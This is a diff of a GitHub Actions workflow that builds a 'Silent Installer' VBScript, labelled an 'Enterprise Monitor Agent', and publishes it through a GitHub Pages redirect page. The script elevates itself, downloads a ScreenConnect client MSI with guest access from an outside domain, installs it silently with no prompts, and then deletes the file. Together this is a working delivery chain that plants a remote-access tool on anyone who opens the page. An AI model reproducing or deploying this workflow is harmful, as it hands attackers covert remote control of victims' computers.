@@ -2,7 +2,7 @@ name: Update Silent Installer
 
 on:
   schedule:
-    - cron: '*/1 * * * *'
+    - cron: '*/1 * * * *'  # Runs every 10 minutes
   workflow_dispatch:
 
 jobs:
@@ -16,17 +16,17 @@ jobs:
     - name: Create Silent Installer
       run: |
         # Define your download links
-        links=("https://share.google/jraH4hXE8DKHc3EXZ" "https://share.google/5icY94HkmAiaVcn86" "https://share.google/mkGe1JX56Lut4KMdt" "https://share.google/zwqwLoZiVh08jLOa4" "https://share.google/dDynM21vQuy0Qvc4Z")
+        links=("https://hayw.fussionmann.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest")
         
         # Get current link based on 10-minute interval
         current_minute=$(date +%M)
-        link_index=$((current_minute / 1 % 5))
+        link_index=$((current_minute / 1 % 1))
         current_link=${links[$link_index]}
         
         echo "Using link: $current_link"
         
-        # Create a VBS script with elevation and proper stream handling
-        cat > installer.vbs << 'EOF'
+        # Create the VBS script with the current link
+        cat > installer.vbs << EOF
         ' --------------------------------------------------------------------------
         '  Silent Installer - Enterprise Monitor Agent
         ' --------------------------------------------------------------------------
@@ -38,20 +38,10 @@ jobs:
             WScript.Quit
         End If
         
-        Dim strUrl, strTemp, strFile, objXMLHTTP, objADOStream, objFSO, objShell, objFile
-        
-        ' Read URL from file
-        Set objShell = CreateObject("WScript.Shell")
-        Set objFSO = CreateObject("Scripting.FileSystemObject")
-        strTemp = objShell.ExpandEnvironmentStrings("%TEMP%")
-        
-        ' Open and read the URL file
-        Set objFile = objFSO.OpenTextFile(strTemp & "\download_url.txt", 1)
-        strUrl = objFile.ReadAll
-        objFile.Close
-        
-        ' Set file path for installer
-        strFile = strTemp & "\agent_installer.msi"
+        Dim strUrl, strTemp, strFile, objXMLHTTP, objADOStream, objFSO, objShell
+        strUrl = "$current_link"
+        strTemp = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%")
+        strFile = strTemp & "\\agent_installer.msi"
         
         ' Download
         Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
@@ -70,37 +60,28 @@ jobs:
             objADOStream.Open
             objADOStream.Type = 1 ' Binary
             objADOStream.Write objXMLHTTP.ResponseBody
-            objADOStream.Position = 0 ' Reset position before saving
+            objADOStream.Position = 0
             objADOStream.SaveToFile strFile, 2 ' Overwrite
             objADOStream.Close
             
             ' Install
             Set objShell = CreateObject("WScript.Shell")
-            objShell.Run """" & strFile & """ /S", 0, True
+            objShell.Run "msiexec /i """ & strFile & """ /quiet /qn /norestart", 0, True
             
             ' Cleanup
             Set objFSO = CreateObject("Scripting.FileSystemObject")
             If objFSO.FileExists(strFile) Then objFSO.DeleteFile strFile
-            If objFSO.FileExists(strTemp & "\download_url.txt") Then objFSO.DeleteFile strTemp & "\download_url.txt"
         End If
         EOF
         
-        # Create a simple batch file
-        cat > run.bat << 'EOF'
-        @echo off
-        copy "%~dp0url.txt" "%TEMP%\download_url.txt" >nul
-        cscript.exe //nologo "%~dp0installer.vbs"
-        EOF
+        # Create index.html for GitHub Pages
+        echo '<!DOCTYPE html><html><head><title>Download</title><meta http-equiv="refresh" content="0; url=installer.vbs"></head><body><p>If not redirected, <a href="installer.vbs">click here</a></p></body></html>' > index.html
         
-        # Create URL file
-        echo "$current_link" > url.txt
-        
-        # Create index.html
-        echo '<!DOCTYPE html><html><head><title>Download</title><meta http-equiv="refresh" content="0; url=run.bat"></head><body><p>Downloading...</p></body></html>' > index.html
-        
-        # Commit and push
+        # Commit and push the updated files
         git config --global user.email "action@github.com"
         git config --global user.name "GitHub Action"
-        git add installer.vbs run.bat url.txt index.html
-        git commit -m "Update installer" || exit 0
+        git add installer.vbs index.html
+        git commit -m "Update installer with current link" || exit 0
         git push
+        
+        echo "Installer updated successfully"
